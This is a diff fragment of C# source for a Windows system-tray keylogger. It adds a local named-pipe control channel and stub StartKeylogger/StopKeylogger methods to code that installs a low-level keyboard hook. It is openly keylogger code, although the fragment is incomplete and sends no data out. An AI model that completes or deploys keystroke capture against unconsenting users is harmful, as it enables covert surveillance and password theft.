@@ -6,14 +6,15 @@ using System.Threading.Tasks;
 using System.Drawing;
 using System.Windows.Forms;
 using System.Threading;
-using System.Threading.Tasks;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using KeyloggerCommunications;
+using System.ServiceModel;
 
 namespace WTKL
 {
-    class SystemTrayKeylogger : Form
+    class SystemTrayKeylogger : Form, KeyloggerCommInterface
     {
         private NotifyIcon trayIcon;
         private ContextMenu trayMenu;
@@ -22,6 +23,7 @@ namespace WTKL
         private static LowLevelKeyboardProc _proc = HookCallback;
         private static IntPtr _hookID = IntPtr.Zero;
         private static bool logging = false;
+        private ServiceHost host = new ServiceHost(typeof(KeyloggerCommInterface), new Uri("net.pipe://localhost"));
 
         public SystemTrayKeylogger()
         {
@@ -63,6 +65,27 @@ namespace WTKL
             _hookID = SetHook(_proc);
             logging = true;
             Application.Run(new SystemTrayKeylogger());
+        }
+
+        private void CreateOpenPipe()
+        {
+            host.AddServiceEndpoint(typeof(KeyloggerCommInterface), new NetNamedPipeBinding(), "PipeKeylogger");
+            host.Open();
+        }
+
+        private void ClosePipe()
+        {
+            host.Close();
+        }
+
+        public bool StartKeylogger()
+        {
+            return false;
+        }
+
+        public bool StopKeylogger()
+        {
+            return false;
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
